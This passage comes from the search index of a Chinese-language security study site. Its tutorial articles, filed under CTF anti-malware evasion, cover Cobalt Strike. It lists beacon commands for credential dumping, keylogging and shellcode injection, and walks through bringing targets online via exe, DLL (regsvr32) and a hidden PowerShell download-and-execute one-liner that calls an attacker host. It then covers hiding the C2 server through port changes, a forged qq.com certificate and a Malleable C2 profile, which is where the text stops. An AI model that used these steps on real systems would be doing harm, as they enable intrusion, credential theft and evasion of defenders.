Console,\u5728beacon\u5904\u8f93\u5165help\u53ef\u4ee5\u770b\u5230\u547d\u4ee4\u8bf4\u660e</p> <pre><code>beacon&gt; help\n\nBeacon Commands\n===============\n\n    Command                   Description\n    -------                   -----------\n    argue                     Spoof arguments for matching processes  \u8fdb\u7a0b\u53c2\u6570\u6b3a\u9a97  ( net user add mhx 123456)\n    blockdlls                 Block non-Microsoft DLLs in child processes   \u5728\u5b50\u8fdb\u7a0b\u4e2d\u963b\u6b62\u975eMicrosoft\u7684DLLs\u6587\u4ef6\n    browserpivot              Setup a browser pivot session   \u6ce8\u5165\u53d7\u5bb3\u8005\u6d4f\u89c8\u5668\u8fdb\u7a0b\n    cancel                    Cancel a download that's in-progress  \u53d6\u6d88\u6b63\u5728\u8fdb\u884c\u7684\u4e0b\u8f7d\n    cd                        Change directory   \u5207\u6362\u76ee\u5f55\n    checkin                   Call home and post data   \u5f3a\u5236\u8ba9\u88ab\u63a7\u7aef\u56de\u8fde\u4e00\u6b21\n    clear                     Clear beacon queue   \u6e05\u9664beacon\u5185\u90e8\u7684\u4efb\u52a1\u961f\u5217\n    connect                   Connect to a Beacon peer over TCP   \u901a\u8fc7TCP\u8fde\u63a5\u5230Beacon  # \u6b63\u5411\u6728\u9a6c\n    covertvpn                 Deploy Covert VPN client   \u90e8\u7f72Covert VPN\u5ba2\u6237\u7aef\n    cp                        Copy a file  \u590d\u5236\u6587\u4ef6\n    dcsync                    Extract a password hash from a DC   \u4eceDC\u4e2d\u63d0\u53d6\u5bc6\u7801\u54c8\u5e0c\n    desktop                   View and interact with target's desktop  \u8fdc\u7a0bVNC\n    dllinject                 Inject a Reflective DLL into a process   \u53cd\u5c04DLL\u6ce8\u5165\u8fdb\u7a0b\n    dllload                   Load DLL into a process with LoadLibrary()   \u4f7f\u7528LoadLibrary\u5c06DLL\u52a0\u8f7d\u5230\u8fdb\u7a0b\u4e2d\n    download                  Download a file   \u4e0b\u8f7d\u6587\u4ef6\n    downloads                 Lists file downloads in progress   \u5217\u51fa\u6b63\u5728\u8fdb\u884c\u7684\u6587\u4ef6\u4e0b\u8f7d\n    drives                    List drives on target   \u5217\u51fa\u76ee\u6807\u76d8\u7b26 \n    elevate                   Spawn a session in an elevated context   \u5c1d\u8bd5\u63d0\u6743\n    execute                   Execute a program on target (no output)   \u5728\u76ee\u6807\u4e0a\u6267\u884c\u7a0b\u5e8f(\u65e0\u8f93\u51fa)\n    execute-assembly          Execute a local .NET program in-memory on target    \u5728\u76ee\u6807\u673a\u5668\u5185\u5b58\u4e2d\u6267\u884c\u672c\u5730.NET\u7a0b\u5e8f(path: \u5ba2\u6237\u7aef)\n    exit                      Terminate the beacon session   \u9000\u51fabeacon\n    getprivs                  Enable system privileges on current token   \u5bf9\u5f53\u524d\u4ee4\u724c\u542f\u7528\u7cfb\u7edf\u6743\u9650\n    getsystem                 Attempt to get SYSTEM     \u5c1d\u8bd5\u83b7\u53d6SYSTEM\u6743\u9650\n    getuid                    Get User ID    \u83b7\u53d6\u7528\u6237ID\n    hashdump                  Dump password hashes    \u8f6c\u50a8\u5bc6\u7801\u54c8\u5e0c\u503c\n    help                      Help menu   \u5e2e\u52a9\n    inject                    Spawn a session in a specific process   \u5728\u7279\u5b9a\u8fdb\u7a0b\u4e2d\u751f\u6210\u4f1a\u8bdd\n    jobkill                   Kill a long-running post-exploitation task\n    jobs                      List long-running post-exploitation tasks\n    jump                      Spawn a session on a remote host\n    kerberos_ccache_use       Apply kerberos ticket from cache to this session\n    kerberos_ticket_purge     Purge kerberos tickets from this session\n    kerberos_ticket_use       Apply kerberos ticket to this session\n    keylogger                 Inject a keystroke logger into a process\n    kill                      Kill a process\n    link                      Connect to a Beacon peer over a named pipe\n    logonpasswords            Dump credentials and hashes with mimikatz\n    ls                        List files\n    make_token                Create a token to pass credentials\n    mimikatz                  Runs a mimikatz command\n    mkdir                     Make a directory\n    mode dns                  Use DNS A as data channel (DNS beacon only)\n    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)\n    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)\n    mv                        Move a file\n    net                       Network and host enumeration tool\n    note                      Assign a note to this Beacon       \n    portscan                  Scan a network for open services\n    powerpick                 Execute a command via Unmanaged PowerShell\n    powershell                Execute a command via powershell.exe\n    powershell-import         Import a powershell script\n    ppid                      Set parent PID for spawned post-ex jobs\n    ps                        Show process list\n    psinject                  Execute PowerShell command in specific process\n    pth                       Pass-the-hash using Mimikatz\n    pwd                       Print current directory\n    reg                       Query the registry\n    remote-exec               Run a command on a remote host\n    rev2self                  Revert to original token\n    rm                        Remove a file or folder\n    rportfwd                  Setup a reverse port forward\n    run                       Execute a program on target (returns output)\n    runas                     Execute a program as another user\n    runasadmin                Execute a program in an elevated context\n    runu                      Execute a program under another PID\n    screenshot                Take a screenshot\n    setenv                    Set an environment variable\n    shell                     Execute a command via cmd.exe\n    shinject                  Inject shellcode into a process\n    shspawn                   Spawn process and inject shellcode into it\n    sleep                     Set beacon sleep time\n    socks                     Start SOCKS4a server to relay traffic\n    socks stop                Stop SOCKS4a server\n    spawn                     Spawn a session \n    spawnas                   Spawn a session as another user\n    spawnto                   Set executable to spawn processes into\n    spawnu                    Spawn a session under another process\n    ssh                       Use SSH to spawn an SSH session on a host\n    ssh-key                   Use SSH to spawn an SSH session on a host\n    steal_token               Steal access token from a process\n    timestomp                 Apply timestamps from one file to another\n    unlink                    Disconnect from parent Beacon\n    upload                    Upload a file\n</code></pre> <p>\u53ef\u7528help+\u547d\u4ee4\u7684\u65b9\u5f0f\u67e5\u770b\u5177\u4f53\u547d\u4ee4\u53c2\u6570\u8bf4\u660e</p> <pre><code>beacon&gt; help argue\nUse: argue [command] [fake arguments]\n     argue [command]\n     argue\n\nSpoof [fake arguments] for [command] processes launched by Beacon.\nThis option does not affect runu/spawnu, runas/spawnas, or post-ex jobs.\n\nUse argue [command] to disable this feature for the specified command.\n\nUse argue by itself to list programs with defined spoofed arguments.\n</code></pre> <p>\u9000\u51fa\u4f1a\u8bdd:\u9009\u4e2d\u4f1a\u8bdd , \u53f3\u952e\u9000\u51fa\u56de\u8bdd , \u7136\u540e\u5220\u9664\u56de\u8bdd , \u5982\u679c\u518d\u6b21\u4e0a\u7ebf\u4e86, \u518d\u5220\u9664\u4e00\u6b21</p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#8cs","title":"8.CS\u4e0a\u7ebf\u7c7b\u578b","text":"<p>CS\u652f\u6301\u591a\u79cd\u82b1\u6837\u4e0a\u7ebf\u6a21\u5f0f\uff0c\u5728\u8fd9\u91cc\u9010\u4e2a\u4ecb\u7ecd \uff1a</p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#81exe","title":"8.1exe\u4e0a\u7ebf(\u6709\u9636\u6bb5)","text":"<p>\u653b\u51fb -&gt; \u751f\u6210\u540e\u95e8 -&gt; windows\u53ef\u6267\u884c\u7a0b\u5e8f , \u9009\u62e9\u76d1\u542c\u5668\u548c\u5bf9\u5e94\u7684\u64cd\u4f5c\u7cfb\u7edf\u4f4d\u6570</p> <p></p> <p>\u9009\u62e9\u4fdd\u5b58\u8def\u5f84</p> <p></p> <p>\u7136\u540e\u628a\u751f\u6210\u7684\u6728\u9a6c\u653e\u5230\u76ee\u6807\u9776\u673a\u4e2d , \u53cc\u51fb\u8fd0\u884c , \u6210\u529f\u4e0a\u7ebf</p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#82exe","title":"8.2exe\u4e0a\u7ebf(\u65e0\u9636\u6bb5)","text":"<p>\u8fd0\u884c\u4e0a\u7ebf</p> <p></p> <p>\u8fd0\u884c\u4e0a\u7ebf</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#83stagedstageless","title":"8.3Staged\u548cStageless\u7684\u533a\u522b","text":""},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#exe","title":"\u751f\u6210\u7684exe\u4f53\u79ef\u4e0d\u540c","text":""},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#_1","title":"\u4e0a\u7ebf\u7684\u7ecf\u8fc7\u7684\u6d41\u7a0b\u4e0d\u540c\uff1a","text":""},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#staged","title":"Staged\uff08\u6709\u9636\u6bb5\uff09:","text":"<ul> <li> <p>\u5b9a\u4e49\uff1a \u5728\u6709\u9636\u6bb5\u7684\u6267\u884c\u65b9\u5f0f\u4e2d\uff0cCobalt Strike Payload \u5206\u4e3a\u4e24\u4e2a\u4e3b\u8981\u9636\u6bb5\uff0c\u5373 Stager \u548c Stage\u3002</p> </li> <li> <p>Stager\uff08\u521d\u59cb\u6267\u884c\u8f7d\u8377\uff09\uff1a\u4e0b\u8f7d\u4e00\u4e2a\u4e1c\u897f</p> </li> </ul> <p>\u5b9a\u4e49\uff1a Stager\u662f<code>Stage 1</code>\uff0c\u662f\u4e00\u4e2a\u8f83\u5c0f\u7684\u3001\u8f7b\u91cf\u7ea7\u7684\u521d\u59cb\u6267\u884c\u8f7d\u8377\u3002 \u4f5c\u7528\uff1a \u4e3b\u8981\u4efb\u52a1\u662f\u4e0eCobalt Strike\u56e2\u961f\u670d\u52a1\u5668\u5efa\u7acb\u521d\u59cb\u8fde\u63a5\uff0c\u5e76\u4ece\u670d\u52a1\u5668\u4e0b\u8f7d\u66f4\u5927\u7684Payload\uff0c\u4e5f\u5c31\u662f<code>Stage 2</code></p> <ul> <li>Stage \uff08\u66f4\u5927\u3001\u5b8c\u6574\u7684\u6267\u884c\u8f7d\u8377\uff09\uff1a</li> </ul> <p>\u5b9a\u4e49\uff1a Stage\u662fStage 2\uff0c\u662f\u4e00\u4e2a\u66f4\u5927\u3001\u66f4\u5b8c\u6574\u7684\u6267\u884c\u8f7d\u8377\u3002 \u4f5c\u7528\uff1a \u4e00\u65e6Stager\u4e0eCobalt Strike\u56e2\u961f\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5\uff0cStager\u4f1a\u8bf7\u6c42\u4e0b\u8f7dStage\u3002Stage\u662f\u6574\u4e2aPayload\u7684\u4e3b\u4f53\uff0c\u5305\u542b\u4e86\u66f4\u591a\u7684\u529f\u80fd\u548c\u6a21\u5757\u3002\u4e00\u65e6\u4e0b\u8f7d\uff0cStage\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c\u5e76\u4e0eCobalt Strike\u670d\u52a1\u5668\u4fdd\u6301\u8fde\u63a5\uff0c\u6267\u884c\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u6307\u5b9a\u7684\u5404\u79cd\u547d\u4ee4\u548c\u64cd\u4f5c\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#stageless","title":"Stageless\uff08\u65e0\u9636\u6bb5\uff09:","text":"<ul> <li>\u5b9a\u4e49\uff1a \u5728\u65e0\u9636\u6bb5\u7684\u6267\u884c\u65b9\u5f0f\u4e2d\uff0c\u6574\u4e2a Payload \u5728\u4e00\u6b21\u6027\u7684\u8fc7\u7a0b\u4e2d\u76f4\u63a5\u6267\u884c\uff0c\u800c\u4e0d\u9700\u8981\u5206\u4e3a\u4e24\u4e2a\u9636\u6bb5\u3002</li> <li>\u7279\u70b9\uff1a \u7531\u4e8e\u65e0\u9636\u6bb5\u7684\u6267\u884c\u65b9\u5f0f\u51cf\u5c11\u4e86\u4e0e\u56e2\u961f\u670d\u52a1\u5668\u7684\u4ea4\u4e92\uff0c\u56e0\u6b64\u53ef\u80fd\u66f4\u96be\u88ab\u68c0\u6d4b\u3002\u7136\u800c\uff0c\u8fd9\u4e5f\u9650\u5236\u4e86 Payload \u7684\u5927\u5c0f\uff0c\u56e0\u4e3a\u6574\u4e2a Payload \u9700\u8981\u5728\u4e00\u6b21\u8fde\u63a5\u4e2d\u4f20\u8f93\u3002</li> </ul> <p>Staged \u4e0a\u7ebf\u6709web\u65e5\u5fd7\uff1a</p> <p></p> <p></p> <p>Stageless \u4e0a\u7ebf\u662f\u6ca1\u6709web\u65e5\u5fd7\u7684</p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#84powershell-command","title":"8.4powershell command\u4e0a\u7ebf","text":"<p>\u9009\u62e9\u5bf9\u5e94\u7684\u76d1\u542c\u5668 , \u9009\u62e9powershell command\u547d\u4ee4</p> <p></p> <p>\u5c06\u751f\u6210\u7684 payload.txt\u4e2d\u7684\u547d\u4ee4\u590d\u5236 , \u7136\u540e\u5728\u9776\u673a\u4e2d\u6267\u884c</p> <p></p> <p>\u6267\u884cpowershell\u547d\u4ee4\uff0c\u6210\u529f\u4e0a\u7ebf\u3002</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#85scripted-web-deliverys","title":"8.5Scripted Web Delivery\uff08S)\u4e0a\u7ebf","text":"<p>web\u6295\u6bd2 \u653b\u51fb --&gt; web\u9493\u9c7c --&gt; web\u6295\u9012</p> <p></p> <p>\u7b2c\u4e8c\u6b65\u8f93\u5165\u914d\u7f6e \uff0c \u751f\u6210</p> <p></p> <p></p> <pre><code>powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://IPS:1234/a'))\"\n</code></pre> <p>\u672c\u8d28\u4e0a\u4e5f\u662f\u901a\u8fc7powershell\u8fdc\u7a0b\u52a0\u8f7d\u4e0a\u7ebf , \u4f46\u662f\u7a0d\u5fae\u6709\u70b9\u4e0d\u540c , \u8fd9\u4e2d\u653b\u51fb\u65b9\u5f0f\u662f\u653b\u51fb\u8005\u5728cs\u670d\u52a1\u5668\u4e0a\u5f00\u542f\u4e00\u4e2aweb\u7ad9\u70b9 , \u7136\u540e\u9776\u673a\u4e2d\u8fd0\u884cpowershell\u547d\u4ee4\u53bb\u8be5\u7ad9\u70b9 , \u53d1\u8d77\u8bf7\u6c42 , \u7136\u540e\u54cd\u5e94\u7684\u5185\u5bb9\u4f5c\u4e3apowershell\u8981\u6267\u884c\u7684\u547d\u4ee4 , \u6267\u884c,\u5c5e\u4e8epayload\u8fdc\u7a0b\u52a0\u8f7d\u6267\u884c\u7684\u4e00\u79cd\u65b9\u5f0f</p> <p></p> <p>\u5728\u9776\u673a\u547d\u4ee4\u884c\u4e2d\u8f93\u5165\u751f\u6210\u7684\u547d\u4ee4\u3002</p> <p></p> <p>\u4e0a\u7ebf\u6210\u529f</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#86dll","title":"8.6DLL\u6587\u4ef6\u4e0a\u7ebf","text":"<p>\u653b\u51fb --&gt; \u751f\u6210\u540e\u95e8 ---&gt; windows exe , \u751f\u6210dll\u6587\u4ef6</p> <p></p> <p></p> <p>\u5c06\u751f\u6210\u7684dll\u6587\u4ef6\u4e0a\u4f20\u5230\u9776\u673a \uff0c \u7136\u540e\u5728\u9776\u673a\u6ce8\u518cdll\u6587\u4ef6\u4e0a\u7ebf</p> <pre><code>regsvr32 artifact.dll\n</code></pre> <p>regsvr32 \u662f\u4e00\u4e2aWindows\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u7528\u4e8e\u6ce8\u518c\u548c\u53d6\u6d88\u6ce8\u518cDLL\uff08\u52a8\u6001\u94fe\u63a5\u5e93\uff09\u548cOCX\uff08ActiveX \u63a7\u4ef6\uff09\u6587\u4ef6\u3002\u901a\u8fc7\u4f7f\u7528regsvr32\uff0c\u4f60\u53ef\u4ee5\u5c06\u67d0\u4e2aDLL\u6587\u4ef6\u6ce8\u518c\u5230\u7cfb\u7edf\u4e2d\uff0c\u4f7f\u5176\u80fd\u591f\u88ab\u5176\u4ed6\u7a0b\u5e8f\u8c03\u7528\u3002</p> <p>\u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u5c1d\u8bd5\u5c06\u540d\u4e3a artifact.dll \u7684DLL\u6587\u4ef6\u6ce8\u518c\u5230\u7cfb\u7edf\u4e2d\u3002\u6267\u884c\u8be5\u547d\u4ee4\u540e\uff0cWindows\u4f1a\u8c03\u7528\u8be5DLL\u6587\u4ef6\u4e2d\u7684 DllRegisterServer \u51fd\u6570\uff0c\u4ee5\u4fbf\u5c06\u5176\u6ce8\u518c\u5230Windows\u6ce8\u518c\u8868\u4e2d\uff0c\u5141\u8bb8\u7cfb\u7edf\u548c\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8fd9\u4e2aDLL\u6587\u4ef6\u4e2d\u7684\u529f\u80fd\u3002</p> <p></p> <p></p> <p>\u6210\u529f\u4e0a\u7ebf</p> <p></p> <p>\u8865\u5145\uff1a</p> <p>\u5728windows\u4e2d\u53ef\u6267\u884c\u6587\u4ef6 , \u4e0d\u662f\u53ea\u6709.exe\u6587\u4ef6 , .dll\u6587\u4ef6\u548c.com\u6587\u4ef6\u4e5f\u90fd\u662f\u53ef\u6267\u884c\u6587\u4ef6</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html","title":"1.\u4ec0\u4e48\u662f\u7279\u5f81","text":"<p>\u7279\u5f81 : \u4eba\u6216\u4e8b\u7269\u53ef\u4f9b\u8bc6\u522b\u7684\u7279\u6b8a\u7684\u8c61\u5f81\u6216\u6807\u5fd7\u3002 cobalt strike\u4e5f\u6709\u5c5e\u4e8e\u81ea\u5df1\u7684\u7279\u5f81 , \u6bd4\u5982\u9ed8\u8ba4\u5f00\u653e\u7684\u7aef\u53e3\u53f7\u662f50050 , \u81ea\u5e26\u8bc1\u4e66\u91cc\u9762\u6709cobalt strike\u5b57\u7b26 \u7b49</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#2","title":"2.\u4e3a\u4ec0\u4e48\u8981\u4fee\u6539\u7279\u5f81","text":"<p>\u56e0\u4e3acs\u670d\u52a1\u5668\u5982\u679c\u9ed8\u8ba4\u7279\u5f81\u4e0d\u8fdb\u884c\u4fee\u6539\u7684\u8bdd , \u5f88\u5bb9\u6613\u88ab\u641c\u7d22\u5f15\u64ce\u6216\u8005\u5a01\u80c1\u60c5\u62a5\u6807\u8bb0\u6210\u6728\u9a6c\u8fdc\u63a7\u670d\u52a1\u5668 , \u4ee5\u53ca\u8fdb\u884c\u4e00\u4e9b\u7279\u5f81\u7684\u4fee\u6539\u5c31\u7b97ip\u5730\u5740\u66b4\u9732\u4e86 , \u4e5f\u4e0d\u80fd\u76f4\u63a5\u80af\u5b9a\u8fd9\u4e2aip\u662f\u6728\u9a6c\u8fdc\u63a7ip , \u63d0\u9ad8\u81ea\u8eab\u7684\u9690\u85cf\u6027\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#3","title":"3.\u5982\u4f55\u4fee\u6539\u7279\u5f81","text":"<p>\u4fee\u6539\u7279\u5f81\u662f\u9488\u5bf9cs\u670d\u52a1\u7aef\u8fdb\u884c\u7279\u5f81\u7684\u4fee\u6539 , \u5ba2\u6237\u7aef\u4e0d\u9700\u8981\u4fee\u6539 \u7262\u8bb0 : cs\u670d\u52a1\u5668\u9700\u8981\u7684\u65f6\u5019\u518d\u5f00\u542f , \u5e73\u5e38\u4e0d\u9700\u8981\u7684\u65f6\u5019\u5c31\u5173\u95ed</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#31","title":"3.1\u4fee\u6539\u9ed8\u8ba4\u7aef\u53e3","text":"<p>\u8fdb\u5165cs\u7684\u5b89\u88c5\u76ee\u5f55</p> <pre><code>vim teamserver\n</code></pre> <p>\u53ea\u9700\u8981\u4fee\u6539\u6700\u540e\u4e00\u884c\u7684-Dcobaltstrike.server_port ,\u53ef\u4ee5\u662f 80\uff0c443\uff0c3389\uff0c8080\uff0c8443\u7b49\u5e38\u89c1\u7aef\u53e3\uff0c\u524d\u63d0\u662f\u8be5\u7aef\u53e3\u6ca1\u6709\u88ab\u5360\u7528\u3002</p> <pre><code># start the team server.\njava -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=8080 -\nDjavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=Microsoft -\nserver -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar \nserver.TeamServer $*\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#32","title":"3.2\u4fee\u6539\u9ed8\u8ba4\u8bc1\u4e66","text":"<p>\u63a8\u8350\u4ed8\u8d39ssl\u8bc1\u4e66 1.\u8d2d\u4e70\u57df\u540d,\u7533\u8bf7\u514d\u8d39\u7684ssl\u8bc1\u4e66 2.\u4fee\u6539teamserver\u8bc1\u4e66\u5bc6\u7801</p> <p>\u67e5\u770b\u9ed8\u8ba4\u8bc1\u4e66</p> <pre><code>keytool -list -v -keystore cobaltstrike.store\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n\u8f93\u5165\u5bc6\u94a5\u5e93\u53e3\u4ee4: \n# \u9ed8\u8ba4\u53e3\u4ee4\u662f Microsoft ,\u6211\u8fd9\u91cc\u8bbe\u7f6e\u7684\u662f123456\n</code></pre> <p></p> <p>\u751f\u6210\u4f2a\u9020\u8bc1\u4e66</p> <pre><code>mv cobaltstrike.store cobaltstrike.store.bak \nkeytool -keystore cobaltstrike_new.store -storepass 1qazwsx -keypass 1qazwsx -genkey -\nkeyalg RSA -alias qq.com -dname \"CN=US, OU=qq.com, O=Software, L=Somewhere, \nST=Cyberspace, C=CN\"\nmv cobaltstrike_new.store cobaltstrike.store\n</code></pre> <p></p> <p>\u7136\u540e\u5728teamserver\u4e2d\u8bbe\u7f6e\u5373\u53ef</p> <pre><code>-Djavax.net.ssl.keyStore=./cobaltstrike.store # \u6ce8\u610f\u5bc6\u7801\n</code></pre> <p>\u867d\u7136\u4f2a\u88c5\u7684\u8bc1\u4e66\u53ef\u4ee5\u6b3a\u9a97fofa\u8fd9\u7c7b\u641c\u7d22\u5f15\u64ce , \u4f46\u662f\u6bd5\u7adf\u662f\u4f2a\u9020\u7684 , \u4f7f\u7528ssl\u8bc1\u4e66\u67e5\u8be2\u5de5\u5177\u662f\u67e5\u8be2\u4e0d\u5230\u9881\u53d1\u673a\u6784\u7684 , \u56e0\u4e3a\u662f\u6211\u4eec\u81ea\u5df1\u751f\u6210\u7684 , \u771f\u6b63\u7684\u8bc1\u4e66\u662f\u8bc1\u4e66\u7b7e\u53d1\u673a\u6784\u9881\u5e03\u7684 , \u817e\u8baf\u4e91\u8d2d\u4e70\u57df\u540d\u5c31\u53ef\u4ee5\u514d\u8d39\u7533\u8bf7ssl\u8bc1\u4e66 , \u4e0d\u8fc7\u8981\u5b9e\u540d\u5907\u6848 , \u63a8\u8350Cloudflare , letsencrypt\u6216\u5404\u56fd\u5916\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u4e0d\u9700\u8981\u5b9e\u540d\u5907\u6848.</p> <p>\u4f7f\u7528\u9881\u53d1\u7684ssl\u8bc1\u4e66 , \u63a8\u8350 jks\u683c\u5f0f \u7684\u8bc1\u4e66 , \u76f4\u63a5\u4fee\u6539\u6587\u4ef6\u540d , \u7136\u540e\u5728teamserver\u4e2d\u914d\u7f6e\u5c31\u53ef\u4ee5\u4e86</p> <pre><code>mv server.jks cobaltstrike.store\n# \u5728teamserver\u4e2d\u914d\u7f6e\n-Djavax.net.ssl.keyStore=./cobaltstrike.store\n</code></pre> <p>pem\u683c\u5f0f</p> <pre><code>openssl pkcs12 -export -in /api.xxx.com/sss.pem -inkey /api.xxx.com/ssk.pem -out\napi.xxx.com.p12 -name api.xxx.com -passout pass:123456 keytool -importkeystore -\ndeststorepass 123456 -destkeypass 123456 -destkeystore api.xxx.com -src\n</code></pre> <p>pem--&gt;p12--&gt;store\u6587\u4ef6 , \u7136\u540e\u5728teamserver\u4e2d\u914d\u7f6e</p> <p>crt\u683c\u5f0f</p> <pre><code>keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store\n</code></pre> <p>\u7136\u540e\u5728teamserver\u4e2d\u914d\u7f6e,\u63a8\u8350\u4f7f\u7528\u4ed8\u8d39\u8d2d\u4e70\u7684ssl\u8bc1\u4e66 , \u817e\u8baf\u4e91\u662f\u8d2d\u4e70\u57df\u540d\u7136\u540e\u53ef\u4ee5\u514d\u8d39\u7533\u8bf7ssl\u8bc1\u4e66,\u6bd4\u5982\u6211\u7684\u8bc1\u4e66</p> <p></p> <p>\u9ed8\u8ba4\u817e\u8baf\u4e91\u7684ssl\u8bc1\u4e66\u4e0b\u8f7djks\u7684\u5c31\u53ef\u4ee5\u4e86 , \u8bc1\u4e66\u7684\u522b\u540d\u5c31\u662f\u4f60\u7684\u57df\u540d , \u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u67e5\u770b</p> <pre><code>keytool -list -v -keystore file.jks -storepass password \u5176\u4e2dfile.jks\u662f\u8bc1\u4e66\u540d\u5b57\uff0cpassword\u8981\u7528\u5bc6\u94a5\u6765\u4ee3\u66ff\n</code></pre> <p>\u7136\u540e\u641c\u7d22  Alias name \u5c31\u53ef\u4ee5\u770b\u5230\u8bc1\u4e66\u522b\u540d\u4e86.</p> <p>\u5728\u7f51\u7edc\u5b89\u5168\u548c\u52a0\u5bc6\u9886\u57df\uff0cstore\u3001pem \u548c crt \u683c\u5f0f\u6587\u4ef6\u90fd\u662f\u7528\u4e8e\u5b58\u50a8\u548c\u7ba1\u7406\u8bc1\u4e66\u53ca\u5bc6\u94a5\u7684\u6587\u4ef6\u683c\u5f0f\u3002\u5b83\u4eec\u5728\u4f7f\u7528\u573a\u666f\u548c\u5b58\u50a8\u5185\u5bb9\u4e0a\u6709\u6240\u4e0d\u540c\u3002</p> <p>store\u683c\u5f0f\uff1a\u7528\u4e8e\u5b58\u50a8\u4e00\u7ec4\u8bc1\u4e66\u548c\u5bc6\u94a5\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5982 JKS \u6216 PKCS#12\u3002</p> <p>PEM\u683c\u5f0f\uff1a\u4e00\u79cd\u6587\u672c\u683c\u5f0f\uff0c\u53ef\u4ee5\u5b58\u50a8\u8bc1\u4e66\u3001\u79c1\u94a5\u6216\u8bc1\u4e66\u94fe\u3002\u5e38\u89c1\u7684\u6269\u5c55\u540d\u5305\u62ec .pem, .crt, .cer, .key\u3002</p> <p>CRT\u683c\u5f0f\uff1a\u901a\u5e38\u5b58\u50a8\u5355\u4e2a\u8bc1\u4e66\uff0c\u901a\u5e38\u662fPEM\u7f16\u7801\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#33profile","title":"3.3\u914d\u7f6eprofile\u6587\u4ef6","text":"<p>cs\u4e2d\u9ed8\u8ba4\u662f\u6ca1\u6709 profile\u6587\u4ef6 \u7684 , \u9700\u8981\u81ea\u5df1\u914d\u7f6e , \u800c\u4e14\u5b98\u7f51\u79f0profile\u6587\u4ef6\u4e3aMalleablec2,\u6574\u4e2aprofile\u6587\u4ef6\u7684\u914d\u7f6e\u5c31\u662f\u8fdb\u884c\u6d41\u91cf\u4e0a\u7684\u4f2a\u88c5, \u9632\u6eaf\u6e90, \u628a\u547d\u4ee4\u7684\u4e0b\u53d1\u548c\u7ed3\u679c\u7684\u56de\u4f20\u8fdb\u884c\u5305\u88c5 , \u8ba9\u4ed6\u4ece\u6d41\u91cf\u4e0a\u770b\u8d77\u6765\u66f4\u50cf\u662f\u5728\u8bbf\u95ee\u7f51\u9875.</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#_1","title":"\u57fa\u672c\u8bed\u6cd5","text":"<pre><code># this is a comment     # \u662f\u6ce8\u91ca\n# \u8bbe\u7f6e\u5168\u5c40\u53d8\u91cf\uff0c\u548c\u5176\u4ed6\u65e0\u5173\u662fcs\u81ea\u8eab\u7684\u4e00\u4e9b\u673a\u5236\nset global_option \"value\"  \n#\u534f\u8bae\u7684\u914d\u7f6e\uff0c\u5982\uff1ahttp-get , https-post\u7b49\n\nprotocol-transaction {\n  set local_option \"value\";\n  client{\n    # customize client indicators\n  }\n  server{\n    # customize server indicators\n  }\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\u5c31\u662f\u5f88\u7b80\u5355 , \u5c31\u662fset \u548c \u4e00\u4e9b\u534f\u8bae\u4e0a\u7684\u914d\u7f6e \u4e0b\u9762\u4f1a\u4ee5 jquery-c2.4.5-jx.profile \u6587\u4ef6\u4e3a\u4f8b\u6765\u89e3\u91ca\u5176\u4e2d\u7684\u5404\u4e2a\u914d\u7f6e\u9879\u7684\u4f5c\u7528</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#_2","title":"\u5168\u5c40\u53d8\u91cf","text":"<pre><code># Malleable C2 Profile\n# Version: CobaltStrike 4.5 \n# File: jquery-c2.4.5.profile\n# Description: \n#   c2 profile attempting to mimic a jquery.js request #   uses signed certificates\n#   or self-signed certificates\n# Authors: @joevest, @andrewchiles, @001SPARTaN ### Global Option Block\n\n# \u8bbe\u7f6e\u5168\u5c40\u53d8\u91cfsample_name , \u503c\u662f\u5f53\u524d\u6587\u4ef6\u540d\nset sample_name \"jQuery CS 4.5 Profile\";\n# \u8bbe\u7f6e\u5fc3\u8df3\u5305\u7684\u65f6\u95f4 , \u5355\u4f4d\u6beb\u79d2\nset sleeptime \"1000\";    # 45 Seconds\n# set sleeptime \"&lt;60000&gt;\"; # 1  Minute , \u9ed8\u8ba4\u7684\n# \u8bbe\u7f6e\u5fc3\u8df3\u5305\u65f6\u95f4\u7684\u6ce2\u52a8\u8303\u56f4 45 +- 45*37% \nset jitter \"50\";   # % jitter\n\n# 